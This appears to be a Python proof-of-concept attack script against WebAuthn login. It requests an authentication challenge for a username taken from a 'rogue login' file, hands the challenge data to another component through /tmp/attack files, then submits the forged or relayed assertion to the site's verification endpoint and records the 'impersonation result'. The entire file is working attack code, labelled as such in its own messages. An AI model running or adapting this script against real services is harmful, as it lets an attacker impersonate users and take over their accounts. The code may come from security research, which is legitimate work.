#!/usr/bin/python3

import base64
import hashlib
from http import cookies
from pathlib import Path
import requests, sys, ctypes, os

from hashlib import sha256

import json

from getpass import getpass

class AuthenticatorDataFlags():

    up: bool
    uv: bool
    be: bool
    bs: bool
    at: bool
    ed: bool

def is_urlsafe_b64(bytes):
    return ('+' not in bytes.decode()) and ('/' not in bytes.decode())

# Some credential IDs are coming from Webauthn without padding.
# This creates a problem when decoding, so we pad here with the necessary '='.

def transform_b64_to_urlsafe(bytes):
    if (is_urlsafe_b64(bytes)):
        return bytes
    offset = 4 - len(bytes) % 4
    bytes = bytes + bytearray(b'=') * offset
    return base64.urlsafe_b64encode(base64.b64decode(bytes))

def transform_urlsafe_to_b64(bytes):
    if (not is_urlsafe_b64(bytes)):
            return bytes
    offset = 4 - len(bytes) % 4
    bytes = bytes + bytearray(b'=') * offset
    return base64.b64encode(base64.urlsafe_b64decode(bytes))

def start_assertion (domain, username):

    try:

        requestBody = {
            "username": username,
            "user_verification": "preferred"
        }

        requestHeaders = {
            "Cookie": "_ga=aaaaaaa; sessionid=aaaaaaaaaaaaaaa"
        }

        response = requests.post(url=domain + '/authentication/options', json=requestBody, headers=requestHeaders)

        print("Webauthn.io response code to HTTP request to {0}: {1}".format(response.url, response.status_code))

        body = response.json()  

        print(body)

        challenge = body["challenge"].replace("=","")

        clientDataJSON = {
                    "type": "webauthn.get",
                    "challenge": challenge,
                    "origin": domain,
                    "crossOrigin": False
                }

        clientDataJSON_serialized = json.dumps(clientDataJSON).replace(" ","")

        sha256_hash = hashlib.sha256()
        sha256_hash.update(clientDataJSON_serialized.encode())

        clientDataHash = sha256_hash.digest()

        # print(body["allowCredentials"][0]["id"].encode())
        # print(transform_urlsafe_to_b64(body["allowCredentials"][0]["id"].encode()))

        print("Saving assert data!")
        with open("/tmp/attack/assert_input_file.txt", "wb") as assert_data:
            print("Writing clientDataHash")
            assert_data.write(base64.b64encode(clientDataHash) + b'\n')
            print("Writing rpID")
            assert_data.write(body["rpId"].encode() + b'\n')
            print("Writing credential")
            assert_data.write(transform_urlsafe_to_b64((body["allowCredentials"][0]["id"]).encode()) + b'\n')
            print("Wrote")


        print("Saving challenge data!")
        with open("/tmp/attack/.rp_challenge", "wb") as rp_challenge_file:
            rp_challenge_file.write(challenge.encode())

        print("Assertion start finished!")
    
    except Exception as e:

        print(e)

        return -1

    return 1
    
def complete_assertion (domain, username):

    try:
        challenge = None
        authdata = None
        sig = None

        cred_id = None

        with open("/tmp/attack/assert_response.txt", "rb") as assert_response_file:
            challenge = assert_response_file.readline()[:-1]
            authdata = assert_response_file.readline()[:-1]
            sig = assert_response_file.readline()[:-1]
            cred_id = assert_response_file.readline()[:-1]

        with open("/tmp/attack/.rp_challenge", "rb") as rp_challenge_file:
            challenge = rp_challenge_file.read()

        clientDataJSON = {
                    "type": "webauthn.get",
                    "challenge": challenge.decode(),
                    "origin": domain,
                    "crossOrigin": False
                }

        clientDataJSON_json = json.dumps(clientDataJSON).replace(" ","")

        requestBody = {
            "username": username,
            "response": {
                "id": transform_b64_to_urlsafe(cred_id).decode().replace("=",""),
                "rawId": transform_b64_to_urlsafe(cred_id).decode().replace("=",""),
                "type": "public-key",
                "response": {
                    "authenticatorData": transform_b64_to_urlsafe(authdata).decode().replace("=",""),
                    "clientDataJSON": base64.urlsafe_b64encode(clientDataJSON_json.encode()).decode().replace("=",""),
                    "signature": transform_b64_to_urlsafe(sig).decode().replace("=",""),
                    "userHandle": ""
                },
                "clientExtensionResults": {},
                "authenticatorAttachment": "cross-platform"
            }
            
        }

        requestHeaders = {
            "Cookie": "_ga=aaaaaaa; sessionid=aaaaaaaaaaaaaaa"
        }

        response = requests.post(url=domain + '/authentication/verification', json=requestBody, headers=requestHeaders)

        if (response.status_code == 200):
            print("\nAttack completed successfully!\n")
            print(response.text)
        else:
            print("\nAttack failed! Server respone: [{0}] - {1}\n".format(response.status_code, response.text))

        with open("/tmp/attack/.impersonation_result", "w") as result_file:
            result_file.write(response.text)

    except Exception as e:

        print(e)

        print("\nAttack failed!\n")

        return -1

    os.remove("/tmp/attack/.rp_challenge")

    return 1

def run():

    print("\nPython script started!")

    num_of_args = len(sys.argv)

    if (num_of_args < 2):
        print("Insufficient arguments! Existing...")
        return

    operation = 1 if (sys.argv[1] == "-start") else 2
    domain = "https://webauthn.io" if (num_of_args < 3) else sys.argv[2]

    username = "default_username"

    try:
        with open("/tmp/attack/.rogue_login", "rb") as rogue_login_file:
            username = rogue_login_file.readline().decode().replace("\n","")
    except:
        print("No rogue login file exists, aborting...")
        return
        
    print("\nWill %s assertion from domain %s and for user %s!" % ("start" if (operation == 1) else "complete", domain, username))

    response = start_assertion(domain, username) if (operation == 1) else complete_assertion(domain, username)

    

if __name__ == "__main__":
    run()